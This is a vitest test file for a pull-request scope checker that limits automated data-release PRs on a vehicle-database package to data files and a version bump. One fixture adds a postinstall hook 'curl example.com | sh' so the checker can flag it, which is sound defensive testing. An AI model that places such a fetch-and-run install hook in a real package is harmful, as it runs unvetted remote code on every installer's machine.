import { expect, test } from "vitest";
import { outOfScopePaths, packageJsonChangesBeyondVersion, requestScopeProblems } from "./check-request-pr-scope";

const pkg = (over: object = {}) => JSON.stringify({ name: "@meterapp/vehicle-db", version: "2.68.0", scripts: { test: "vitest run" }, devDependencies: { vitest: "1.0.0" }, ...over });
// The files every merged request pull request has touched (#84, #86, #88, #89).
const dataRelease = ["CHANGELOG.md", "README.md", "data/compact.json", "data/evidence/manufacturer-reviewed.json", "data/sources/manufacturer-reviewed-catalog.json", "package.json", "scripts/fixtures/resolution-replay.json", "src/data.ts"];

test("a data release with a version bump is in scope", () => {
  expect(requestScopeProblems({ headRef: "request/67a61efe-vinfast-vf-5", paths: dataRelease, basePackageJson: pkg(), headPackageJson: pkg({ version: "2.69.0" }) })).toEqual([]);
});
test("code, workflows, dependencies and the lockfile are out of scope", () => {
  expect(outOfScopePaths([...dataRelease, ".github/workflows/publish.yml", "scripts/build-db.ts", "src/index.ts", "pnpm-lock.yaml", "src/data.test.ts"]))
    .toEqual([".github/workflows/publish.yml", "pnpm-lock.yaml", "scripts/build-db.ts", "src/data.test.ts", "src/index.ts"]);
});
test("a file renamed out of an allowed folder is reported under its new name", () => {
  expect(outOfScopePaths(["scripts/postinstall.js", "data/sources/a.json"])).toEqual(["scripts/postinstall.js"]);
});
test("package.json may change its version and nothing else", () => {
  expect(packageJsonChangesBeyondVersion(pkg(), pkg({ version: "2.69.0" }))).toEqual([]);
  expect(packageJsonChangesBeyondVersion(pkg(), pkg({ scripts: { test: "vitest run", postinstall: "curl example.com | sh" }, dependencies: { leftpad: "1.0.0" } }))).toEqual(["dependencies", "scripts"]);
  expect(requestScopeProblems({ headRef: "request/x", paths: ["package.json"], basePackageJson: pkg(), headPackageJson: pkg({ files: ["dist", "scripts"] }) }))
    .toEqual(['package.json: "files" changed; a request pull request may only change "version"']);
});
test("other branches are a person's and are not checked", () => {
  expect(requestScopeProblems({ headRef: "catalog/kia-soluto-cl", paths: ["scripts/build-db.ts"], basePackageJson: pkg(), headPackageJson: pkg() })).toEqual([]);
});
